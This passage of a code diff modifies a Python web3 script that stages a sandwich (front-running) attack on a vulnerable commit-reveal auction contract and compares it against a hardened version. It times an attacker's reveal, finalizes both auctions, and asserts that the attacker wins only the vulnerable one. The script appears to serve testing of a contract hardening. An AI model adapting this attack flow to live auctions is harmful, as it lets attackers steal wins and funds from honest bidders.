+            hard.functions.reveal(ALICE_BID_AMOUNT, ALICE_NONCE_SECRET),
+            alice,
+            value=ALICE_BID_AMOUNT,
+            context_name="Alice's reveal on HARDENED contract",
+            gas_limit=ALICE_GAS_LIMIT
+        )
+    elif alice_revealed_hard:
+        print("Alice already revealed on HARDENED contract.")
+
+    # 5d) Attacker reveals on Vulnerable Auction
+    print("\n--- Attacker Reveal on Vulnerable Auction (Normal Flow) ---")
+    if not bundle_included and current_block <= reveal_end_block:
+        attacker_revealed_vuln = vuln.functions.revealed(attacker.address).call()
+        if not attacker_revealed_vuln:
+            try_send_non_fatal(
+                vuln.functions.reveal(ATTACKER_BID_AMOUNT, ATTACKER_NONCE_SECRET), 
+                attacker, 
+                value=ATTACKER_BID_AMOUNT, 
+                context_name="Attacker's public reveal on VULNERABLE contract",
+                gas_limit=ALICE_GAS_LIMIT # Force high gas limit
+                )
         else:
-            print("Reveal window already passed; cannot broadcast reveal publicly.")
+            print("Attacker already revealed on VULNERABLE contract.")
 
-    # -------------------------------------------------------------------------------
-
-
-    # 5) Also reveal on hardened auction (to keep states comparable)
-    print("Reveal on hardened auction (same preimage)...")
-    if is_token:
-        reveal_hard_signed = build_and_sign_tx(hard.functions.reveal(bid_amount, nonce), alice, value=0)
-    else:
-        reveal_hard_signed = build_and_sign_tx(hard.functions.reveal(bid_amount, nonce), alice, value=bid_amount)
-    send_raw_and_wait(reveal_hard_signed)
-    print("Revealed on hardened auction")
-
-    # 6) Wait until reveal window closes (simple sleep; better: poll block.number)
-    print("Waiting reveal window to close...")
+    # 6) Wait until reveal window closes
     reveal_end_block = vuln.functions.revealEndBlock().call()
     print("revealEndBlock =", reveal_end_block)
-    print("Waiting for block > revealEndBlock (finalize phase)...")
+    print("\nWaiting for block > revealEndBlock (finalize phase)...")
     while True:
         current = w3.eth.block_number
         if current > reveal_end_block:
             print("Now past revealEndBlock at block", current)
             break
         time.sleep(5)
-    # sanity: ensure Alice's reveal was recorded on the vulnerable auction
-    alice_revealed_amount = vuln.functions.revealedBid(alice.address).call()
-    if alice_revealed_amount == 0:
-        print("Warning: Alice reveal not recorded on vulnerable auction (alice_revealed_amount==0).")
 
     # 7) Finalize both auctions (deployer does this)
-
-    while w3.eth.block_number <= reveal_end_block:
-          time.sleep(5)
+    print("\n--- Finalizing Auctions ---")
+    # Get fresh nonce for deployer
+    deployer_nonce = w3.eth.get_transaction_count(deployer.address)
 
     print("Finalizing vulnerable auction...")
-    # Get the current nonce for the deployer
-    deployer_nonce = w3.eth.get_transaction_count(deployer.address)
     finalize_tx_vuln = build_and_sign_tx(vuln.functions.finalize(), deployer, nonce=deployer_nonce)
-    send_raw_and_wait(finalize_tx_vuln.rawTransaction)
-    print("Vulnerable auction finalized.")
+    try:
+        send_raw_and_wait(finalize_tx_vuln)
+        print("Vulnerable auction finalized.")
+    except Exception as e:
+        print(f"Finalize VULNERABLE FAILED. This is non-fatal for assertions if state is already set: {e}")
 
-    print("Finalizing hardened auction...")
-
-    # Increment the nonce for the next transaction from the same account
     deployer_nonce += 1
+    print("Finalizing hardened auction...")
     finalize_tx_hard = build_and_sign_tx(hard.functions.finalize(), deployer, nonce=deployer_nonce)
-    send_raw_and_wait(finalize_tx_hard.rawTransaction)
-    print("Hardened auction finalized.")
+    try:
+        send_raw_and_wait(finalize_tx_hard)
+        print("Hardened auction finalized.")
+    except Exception as e:
+        print(f"Finalize HARDENED FAILED. This is non-fatal for assertions if state is already set: {e}")
+
 
     # 8) Assertions & snapshots
-    print("Running assertions...")
+    print("\n--- Results and Assertions ---")
     run_record = {
         "vuln": vuln_addr,
         "hard": hard_addr,
         "alice": alice.address,
         "attacker": attacker.address,
-        "bid_amount": str(bid_amount),
-        "nonce": nonce.hex()
+        "alice_bid_amount": str(ALICE_BID_AMOUNT),
+        "attacker_bid_amount": str(ATTACKER_BID_AMOUNT),
     }
-
-    # Commit privacy: ensure commitments storage is hash (non-zero) and no plaintext in storage
-    comm = vuln.functions.commitments(alice.address).call()
-    assert comm != b'\x00'*32 and comm is not None, "commit should be non-zero"
-    print("Commit stored (non-zero).")
-
-    # Reveal recorded
-    revealed_v = vuln.functions.revealedBid(alice.address).call()
-    revealed_h = hard.functions.revealedBid(alice.address).call()
-    print("revealed_v:", revealed_v, "revealed_h:", revealed_h)
-    assert revealed_v == bid_amount, "vulnerable reveal mismatch"
-    assert revealed_h == bid_amount, "hardened reveal mismatch"
 
     # Divergence check: winner/winningBid differences
     v_winner = vuln.functions.winner().call()
     h_winner = hard.functions.winner().call()
     v_bid = vuln.functions.winningBid().call()
     h_bid = hard.functions.winningBid().call()
-    print("v_winner", v_winner, "h_winner", h_winner, "v_bid", v_bid, "h_bid", h_bid)
-    diverged = (v_winner != h_winner) or (v_bid != h_bid)
-    assert diverged, "expected divergence between vulnerable and hardened auction outcomes"
-    print("Divergence confirmed.")
+    
+    # Use call() for non-state-changing reads
+    v_eff_bid_attacker = vuln.functions.getRevealedEffectiveBid(attacker.address).call()
+    h_eff_bid_attacker = hard.functions.getRevealedEffectiveBid(attacker.address).call()
+    
+    print(f"Attacker Effective Bid (Vulnerable): {w3.from_wei(v_eff_bid_attacker, 'ether'):.8f} ETH")
+    print(f"Attacker Effective Bid (Hardened):   {w3.from_wei(h_eff_bid_attacker, 'ether'):.8f} ETH")
+    print("---")
+    print(f"Vulnerable Winner: {v_winner} (Bid: {w3.from_wei(v_bid, 'ether')} ETH)")
+    print(f"Hardened Winner:   {h_winner} (Bid: {w3.from_wei(h_bid, 'ether')} ETH)")
+    
+    
+    # Assertions for a successful attack scenario
+    # NOTE: Assertions only run if the flow successfully resulted in a divergence.
+    # If the bundle failed and Alice's public reveal succeeded, the assertions below will FAIL (as expected).
+    try:
+        assert v_winner == attacker.address, "Assertion Failed: Attacker did not win the VULNERABLE auction."
+        assert h_winner == alice.address, "Assertion Failed: Alice did not win the HARDENED auction."
+        assert v_bid == ATTACKER_BID_AMOUNT, "Assertion Failed: Vulnerable winning nominal bid mismatch."
+        assert h_bid == ALICE_BID_AMOUNT, "Assertion Failed: Hardened winning nominal bid mismatch."
+        
+        diverged = (v_winner != h_winner) or (v_bid != h_bid)
+        assert diverged, "Assertion Failed: Expected divergence between vulnerable and hardened auction outcomes."
+        print("\nSuccess: Divergence confirmed. The sandwich attack was successful.")
+    except AssertionError as e:
+        print(f"\n--- ATTACK FAILURE SCENARIO ---")
+        print(f"The attack failed. This means either the bundle was not included OR Alice's public reveal succeeded, overriding the attacker's win.")
+        print(f"Failure Detail: {e}")
+
 
     run_record.update({
-        "revealed_v": str(revealed_v),
-        "revealed_h": str(revealed_h),
         "v_winner": v_winner,
         "h_winner": h_winner,
         "v_bid": str(v_bid),
-        "h_bid": str(h_bid)
+        "h_bid": str(h_bid),
+        "v_eff_bid_attacker": str(v_eff_bid_attacker),
+        "h_eff_bid_attacker": str(h_eff_bid_attacker)
     })
-
-    # Attacker profit check (optional, approximate)
-    try:
-        if is_token:
-            atk_before = erc20.functions.balanceOf(attacker.address).call()
-        else:
-            atk_before = w3.eth.get_balance(attacker.address)
-        # compute after by reading current balances (approx — gas costs ignored unless you compute them)
-        if is_token:
-            atk_after = erc20.functions.balanceOf(attacker.address).call()
-        else:
-            atk_after = w3.eth.get_balance(attacker.address)
-        run_record.update({"attacker_before": str(atk_before), "attacker_after": str(atk_after)})
-        print("Attacker bal before/after:", atk_before, atk_after)
-    except Exception as e:
-        print("Attacker snapshot failed:", e)
 
     # Save run record
     Path("artifacts").mkdir(parents=True, exist_ok=True)
